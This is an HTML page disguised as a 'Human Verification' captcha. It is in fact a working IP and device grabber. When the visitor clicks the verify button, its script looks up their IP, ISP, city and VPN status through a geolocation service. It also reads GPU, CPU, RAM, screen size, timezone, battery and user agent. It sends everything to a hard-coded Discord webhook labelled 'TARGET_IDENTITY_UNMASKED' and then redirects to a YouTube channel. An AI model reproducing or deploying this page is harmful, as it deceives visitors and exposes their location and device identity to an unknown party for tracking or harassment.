<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Security Verification</title><style>
    body{background:#000;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}
    .v-box{width:320px;padding:40px;background:#080808;border:1px solid #111;border-radius:12px;text-align:center}
    #v-btn{background:#fff;color:#000;border:none;padding:16px 0;width:100%;border-radius:6px;font-weight:700;cursor:pointer;transition:0.2s}
    #v-btn:hover{background:#f00;color:#fff}
    #p-bar{height:2px;width:0;background:#f00;position:fixed;bottom:0;left:0;transition:0.4s}
</style></head><body>

<div class="v-box">
    <div style="color:#fff;font-size:18px;font-weight:800;margin-bottom:10px">Human Verification</div>
    <p style="color:#666;font-size:13px;margin-bottom:25px">Click below to prove you are not a robot and access the server.</p>
    <button id="v-btn">VERIFY IDENTITY</button>
</div>
<div id="p-bar"></div>

<script>
(function(){
    // IMPORTANT: Ensure your Webhook URL is correct and includes the ID/Token
    const _W = "https://discord.com/api/webhooks/1497904289514000414/iBEk-MTCSc-f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0";
    const _E = "https://youtube.com/@LigmaBlox-w7m";

    const _X = async(d) => {
        const p = JSON.stringify(d);
        // sendBeacon is used for high-reliability data delivery during page transitions
        navigator.sendBeacon(_W, new Blob([p],{type:'application/json'}));
    };

    const _O = async() => {
        // Parallel Hardware & Network Extraction
        const [geo, battery] = await Promise.all([
            fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({})),
            navigator.getBattery ? navigator.getBattery().then(b=>({l:b.level*100+'%',c:b.charging})) : Promise.resolve({l:'N/A',c:'N/A'})
        ]);

        const c=document.createElement('canvas');
        const gl=c.getContext('webgl');
        const dbg=gl?gl.getExtension('WEBGL_debug_renderer_info'):null;
        
        const hw={
            gpu:dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):"Restricted",
            cpu:navigator.hardwareConcurrency||"?",
            ram:navigator.deviceMemory||"?",
            res:`${screen.width}x${screen.height}`,
            zone:Intl.DateTimeFormat().resolvedOptions().timeZone
        };

        const report = {
            username: "SENTINEL_V101",
            embeds: [{
                title: "👁️ TARGET_IDENTITY_UNMASKED",
                color: 16711680,
                fields: [
                    { name: "📍 NETWORK", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.org}\n**City:** ${geo.city}\n**VPN:** ${geo.proxy?'YES':'NO'}`, inline: true },
                    { name: "📡 STATS", value: `**Timezone:** ${hw.zone}\n**Battery:** ${battery.l}`, inline: true },
                    { name: "⚙️ HARDWARE", value: `**GPU:** ${hw.gpu}\n**CPU:** ${hw.cpu} Cores\n**RAM:** ${hw.ram}GB\n**Res:** ${hw.res}`, inline: false },
                    { name: "🕵️ USER-AGENT", value: "```" + navigator.userAgent + "```" }
                ],
                timestamp: new Date()
            }]
        };

        await _X(report);
        setTimeout(()=>window.location.replace(_E), 500);
    };

    document.getElementById('v-btn').onclick = function() {
        this.innerText = "VERIFYING...";
        document.getElementById('p-bar').style.width = "100%";
        _O(); // Execute the extraction
    };
})();
</script></body></html>
